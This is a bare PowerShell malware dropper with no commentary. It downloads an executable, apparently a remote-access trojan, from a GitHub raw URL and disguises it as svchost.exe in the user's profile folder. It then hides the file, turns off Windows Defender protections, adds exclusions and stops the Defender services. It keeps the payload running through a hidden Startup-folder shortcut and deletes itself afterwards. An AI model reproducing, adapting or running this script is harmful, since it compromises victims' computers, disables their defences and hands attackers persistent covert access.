$url = "https://raw.githubusercontent.com/qwertyuiopkjopl-ops/hjrerjerkr4iuj4tgjtrij/main/powershellRatka.exe"
$destination = "$env:USERPROFILE\svchost.exe"

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/5.0")
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$webClient.DownloadFile($url, $destination)

attrib +H +S $destination

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -ExclusionPath $env:USERPROFILE
Set-MpPreference -ExclusionProcess "svchost.exe"
Set-MpPreference -ExclusionExtension ".exe"

Stop-Service -Name WinDefend -Force
Stop-Service -Name MsMpSvc -Force

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.lnk")
$Shortcut.TargetPath = $destination
$Shortcut.WindowStyle = 7
$Shortcut.Save()

Start-Process -FilePath $destination -WindowStyle Hidden

$scriptPath = $MyInvocation.MyCommand.Path
$batchFile = "$env:TEMP\selfdel.cmd"
"@echo off`ntimeout /t 2 /nobreak >nul`ndel /f /q `"$scriptPath`"`ndel /f /q `"%~f0`"" | Out-File -FilePath $batchFile -Encoding ASCII
Start-Process -FilePath $batchFile -WindowStyle Hidden